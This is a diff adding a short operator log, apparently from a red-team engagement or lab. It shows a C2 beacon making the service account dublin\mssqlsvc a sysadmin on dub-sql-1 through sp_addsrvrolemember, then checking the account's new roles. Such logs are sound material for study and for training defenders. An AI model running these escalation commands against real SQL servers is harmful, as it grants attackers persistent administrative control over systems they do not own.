@@ -179,3 +179,29 @@ SQL Server Connection Info:
  |--> CurrentLogin            : DUBLIN\iappleton
  |--> IsSysAdmin              : True
  |--> ActiveSessions          : 1
+
+okay so mssqlsvc was able to get cifs tickets so lets make that account sysadmin
+[04/30 15:48:17] beacon> sql-query dub-sql-1 "EXEC sp_addsrvrolemember 'dublin\mssqlsvc', 'sysadmin';"
+[04/30 15:50:46] beacon> sql-whoami dub-sql-1
+[04/30 15:50:46] [*] Tasked beacon to gather SQL user info on dub-sql-1
+[04/30 15:50:46] [+] host called home, sent: 14113 bytes
+[04/30 15:50:46] [+] received output:
+[*] Connecting to dub-sql-1:1433
+[+] Successfully connected to database
+[*] Determining user permissions on dub-sql-1
+[*] Logged in as dublin\mssqlsvc
+[*] Mapped to the user dbo
+[*] Gathering roles...
+ |--> User is a member of the public role
+ |--> User is a member of the db_owner role
+ |--> User is a member of the db_accessadmin role
+ |--> User is a member of the db_securityadmin role
+ |--> User is a member of the db_ddladmin role
+ |--> User is a member of the db_backupoperator role
+ |--> User is a member of the db_datareader role
+ |--> User is a member of the db_datawriter role
+ |--> User is NOT a member of the db_denydatareader role
+ |--> User is NOT a member of the db_denydatawriter role
+ |--> User is a member of the sysadmin role
+
+ bet lets try this again
